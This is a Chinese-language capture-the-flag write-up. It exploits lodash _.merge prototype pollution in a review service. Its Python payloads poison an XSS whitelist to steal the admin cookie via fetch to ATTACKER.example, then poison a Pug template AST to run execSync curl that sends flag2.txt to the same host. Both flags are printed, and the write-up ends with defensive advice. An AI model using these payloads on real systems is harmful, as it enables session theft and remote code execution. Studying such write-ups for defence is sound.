# Valentina

## 题目简述

服务使用 lodash 4.17.4 的 _.merge 把 JSON 合并到普通对象，允许通过 __proto__ 污染 Object.prototype。仓库将它作为一个正式目录和一个 ctfd.json，但服务内保留两阶段 flag：第一阶段污染 xss 配置后做管理员 XSS；第二阶段污染 Pug AST 的 block 属性，在模板编译时执行服务端代码并读取 flag2.txt。

## 解题过程

POST /add_review 要求 Content-Type 精确为 application/json。第一阶段向原型写入 whiteList，让 xss 1.0.10 创建的配置对象继承允许 script 的规则，同时提交恶意 message：

~~~python
import requests

target = "http://TARGET"
payload = {
    "__proto__": {"whiteList": {"script": []}},
    "message": (
        '<script>fetch("https://ATTACKER.example/collect?c="'
        "+encodeURIComponent(document.cookie))</script>"
    ),
}
response = requests.post(target + "/add_review", json=payload)
review_id = response.text.rsplit(":", 1)[1]
~~~

把 http://localhost:8999/view_review?review_id=... 提交到 /report。该路由只允许 ::1，正好由 adminbot 访问；管理员 Cookie 被脚本带出。Dockerfile 中 Cookie 值本身是 Base64，解码得到：

~~~text
FLAG1=maple{l0d4sh_more_lyk_n0da5h_haha_get_it}
~~~

第二阶段利用同一个污染点写入 Pug 期望的 block AST 节点。Text 节点的 line 被编译进模板生成代码：

~~~python
payload = {
    "__proto__": {
        "block": {
            "type": "Text",
            "line": (
                "process.mainModule.require('child_process').execSync("
                "'curl https://ATTACKER.example/collect "
                "--data-binary @flag2.txt')"
            ),
        }
    },
    "message": "ok",
}
requests.post(target + "/add_review", json=payload)
requests.get(target + "/")
~~~

GET / 会调用 pug.compileFile，污染的 AST 属性进入编译流程并执行命令。接收端获得：

~~~text
maple{Th1s_was_really_c0mpl1cAted_Im_s0rrY}
~~~

## 方法总结

原型污染本身是能力放大器，最终影响取决于后续 gadget：这里一个 gadget 改变 sanitizer 白名单，另一个进入模板 AST 形成 RCE。应升级存在漏洞的 lodash，拒绝 __proto__、constructor、prototype 等危险键，使用无原型对象和 schema 校验，并让模板编译与应用秘密隔离。审计时要沿污染属性追踪所有消费者，而不是在 _.merge 处停止。
